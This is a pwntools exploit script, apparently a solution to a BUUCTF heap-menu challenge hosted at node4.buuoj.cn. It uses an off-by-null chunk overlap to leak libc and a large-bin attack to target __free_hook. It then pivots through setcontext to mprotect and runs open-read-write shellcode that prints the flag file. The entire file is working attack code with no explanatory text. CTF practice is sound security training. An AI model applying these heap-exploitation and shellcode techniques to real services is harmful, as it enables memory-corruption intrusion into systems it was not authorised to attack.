from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
#elf = ELF("./pwn")
#libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Choice: \n'
def add(size):
	sla(menu, b'1')
	sla(b'Size: ', byte(size))

def edit(idx, content):
	sla(menu, b'2')
	sla(b'Index: ', byte(idx))
	sda(b'Content: ', content)

def dele(idx):
	sla(menu, b'3')
	sla(b'Index: ', byte(idx))

def show(idx):
	sla(menu, b'4')
	sla(b'Index: ', byte(idx))

flag = True
while flag:
	#flag = False
	if True:
		io = remote('node4.buuoj.cn', 26560)
		libc = ELF("/home/isidro/pwnh/buuctf/libc/u16-x64.so")
	else:
		io = process("./pwn")
		elf = ELF("./pwn")
		libc = elf.libc
	add(0x18)  # 0
	add(0x4e8) # 1 --> unsorted bin chunk
	add(0xf8)  # 2

	add(0x18)  # 3

	add(0x18)  # 4
	add(0x4d8) # 5 --> large bin chunk
	add(0xf8)  # 6

	add(0x18)  # 7

	dele(0)      # 0
	edit(1, b'\x00'*0x4e0+p64(0x510))
	dele(2)      # 2
	add(0x18)  # 0
	show(1)
	libc.address = addr(6) - 0x3c4b78
	info("libc_base", libc.address)
	add(0x4e8) # 2 --> control unsorted bin chunk
	add(0xf8)  # 8

	dele(4)      # 4
	edit(5, b'\x00'*0x4d0+p64(0x500))
	dele(6)      # 6
	add(0x18)  # 4
	add(0x4d8) # 6 --> control large bin chunk
	add(0xf8)  # 9

	dele(5)      # 5
	dele(1)      # 1
	add(0x4e8) # 1
	dele(1)      # 1

	free_hook = libc.sym.__free_hook
	info("free_hook", free_hook)
	fake_chunk = free_hook - 0x10
	edit(2, p64(0)+p64(fake_chunk))
	pay = p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)
	edit(6, pay)
	
	try:
		add(0x48) # 1
		rut(b'1.')
		break
	except Exception as e:
		io.close()
		continue

setcontext = libc.sym.setcontext+53
info("setcontext", setcontext)

page = free_hook & 0xfffffffffffff000
info("page", page)
read_orw = asm("""
	mov rdi, 0
	mov rsi, {}
	mov rdx, 0x500
	mov rax, 0
	syscall	
	jmp rsi
""".format(page))

orw = asm('''
	mov rax, 0x67616c662f2e
	push rax

	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x100
	mov rax, 0
	syscall
	
	mov rdi, 1
	mov rsi, rsp
	mov rdx, rax
	mov rax, 1
	syscall

	mov rdi, 0
	mov rax, 60
	syscall
''')

context  = b'\x00'*0x68
context += p64(page) + p64(0x1000) + p64(free_hook+8) + b'\x00'*8 + p64(7) # rdi-rsi-rbp-padding-rdx
context  = context.ljust(0xa0, b'\x00')
context += p64(free_hook+8) + p64(libc.sym.mprotect) # rsp-ret

pay = p64(setcontext) + p64(free_hook+0x10) + read_orw
print(hex(len(context)))
edit(8, context)
edit(1, pay)
dele(8)
sl(orw)
#debug()
sh()
